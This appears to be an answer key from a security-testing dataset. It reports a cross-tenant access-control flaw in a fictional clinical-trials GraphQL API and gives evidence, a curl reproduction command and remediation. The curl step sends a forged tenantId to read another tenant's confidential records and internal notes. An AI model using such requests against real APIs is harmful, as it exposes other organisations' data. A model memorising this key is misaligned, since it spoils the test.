# Expected Response

## System
- Domain: Pharmaceutical / Clinical Trials
- System: TrialVault ClinicalOps API
- Example ID: GQL-0121

## Priority Findings

### Finding 1: Clinical Trial Metadata Side-Channel — listResources Exposes internalNotes Cross-Tenant (Pattern 2.2)
**Severity:** High
**Category:** BAC / Metadata Side-Channel

**Summary:**
Per §5.0 (Pattern 2.2 — metadata/attribute side-channel): The `listResources` endpoint returns `internalNotes` and `auditLog` metadata fields cross-tenant when `tenantId` is client-supplied. An attacker from `tenant-0f80` passed `tenantId: "tenant-c243"` to enumerate clinical trial records. The `internalNotes` field constitutes a side-channel exposing internal trial annotations, adverse event notes, investigator comments, and regulatory compliance notes — protected under GCP and FDA 21 CFR Part 11.

**Evidence from HAR:**
- Request: `POST https://api.trialvault-clinicalo.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-0f80`
- Query: `listResources(tenantId: "tenant-c243") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-c243"`, `ownerId: "other-user-0f80c243"`, `sensitiveField: "CONFIDENTIAL-0f80c243"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-0f80c243`

## Steps to Reproduce

### Step 1 — Cross-tenant clinical trial list with metadata (HAR)
```bash
curl -s -X POST https://api.trialvault-clinicalo.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-0f80" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-c243\") { resourceId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** `CONFIDENTIAL-0f80c243` + `internalNotes` from `tenant-c243`. **Secure:** FORBIDDEN.

## Remediation
1. `listResources` must use JWT `tenantId`.
2. Strip `internalNotes`/`auditLog` from non-admin responses.
3. Field-level authorization for clinical metadata fields.
